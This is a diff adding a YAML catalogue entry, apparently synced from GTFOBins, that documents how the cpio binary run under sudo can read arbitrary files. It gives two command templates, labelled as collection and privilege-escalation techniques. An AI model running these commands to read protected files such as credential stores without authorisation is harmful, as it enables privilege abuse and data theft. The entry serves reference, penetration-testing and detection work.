@@ -1,0 +1,30 @@
+id: gtfobins/cpio/file-read/sudo
+type: binary
+platform: linux
+name: cpio
+phases:
+- collection
+- privilege-escalation
+capabilities:
+- file-read
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: echo /path/to/input-file | cpio -o
+  comment: The content of the file is printed to standard output, between the `cpio` archive format header
+    and footer.
+- template: 'echo /path/to/input-file | cpio -R $UID -dp .
+
+    cat path/to/input-file'
+  comment: The whole directory structure is copied to `.`, hence this is also a file write.
+references:
+- https://gtfobins.github.io/gtfobins/cpio/
+tags:
+- linux
+- unix
+- gtfobins
